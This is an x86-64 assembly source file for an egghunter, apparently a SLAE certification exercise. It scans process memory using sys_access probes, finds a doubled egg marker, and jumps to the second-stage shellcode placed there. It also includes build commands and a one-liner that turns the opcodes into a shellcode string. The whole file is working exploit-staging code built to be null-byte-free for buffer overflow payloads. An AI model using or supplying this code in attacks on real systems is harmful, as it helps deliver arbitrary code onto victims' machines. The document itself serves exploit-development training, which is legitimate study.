; Filename:      egghunter-dec.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  30.01.2019
; Note:          x64
; Assembler:     nasm -f elf64 egghunter-dec.nasm -o egghunter-dec.o
; Linker:        ld -m elf_x86_64 egghunter-dec.o -o egghunter-dec
; Assembly dump: objdump -d ./egghunter-dec|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:

	xor r8, r8           ; Clear r8 register
	xor rsi, rsi         ; Clear rsi register
	xor rdi, rdi         ; Clear rdi register

	mov r8d,0x50905090   ; Set our Egg: X,NOP,X,NOP

	; Set rax 0x00007fffffffffff without null byte
	xor rcx,rcx          ; Clear rcx register
	mul rcx              ; Clear rax & rdx
	mov eax, 0xffffffff  ; Null byte calculation trick
	mov dx, 0x7fff       ; Null byte calculation trick
	inc edx              ; = 0x0800
	mul rdx              ; = 0x7fffffff8000
	add ax, 0x7fff       ; = 0x7fffffffffff
	mov rdx, rax         ; Save starting address in rdx

	; Set R9 0x000000000000f000 without null byte
	xor r9, r9          ; Clear r9 register
	mov r9w, 0x0fff     ; Null byte trick
	not r9w             ; Memory page mask

next_page:

	and dx, r9w          ; Memory alignment, next dec instruction -0x1000

next_address:
; Check if memory address is readable (sys_access)
; int access(const char *pathname, int mode);
	dec rdx              ; rdx - 1

	lea rdi,[rdx-0x4]    ; Last 4 bytes
	xor rax, rax         ; Clear rax register
	mov al, 21           ; sys_access
	syscall

	cmp al,0xf2          ; Compare return in al of sys_access with 0xf2 (EFAULT) and set ZF flag
	jz next_page         ; if EFAULT jump to nextpage

	cmp [rdx-0x4],r8d    ; Compare rdx-4 bytes with egg
	jnz next_address     ; If not egg jump to dec edx
	cmp [rdx-0x8],r8d    ; Compare rdx-8 bytes for our double eggs
	jnz next_address     ; If no second egg jump to next address
	sub rdx, 0x8         ; Set jump address
	jmp rdx              ; Start second stage shellcode
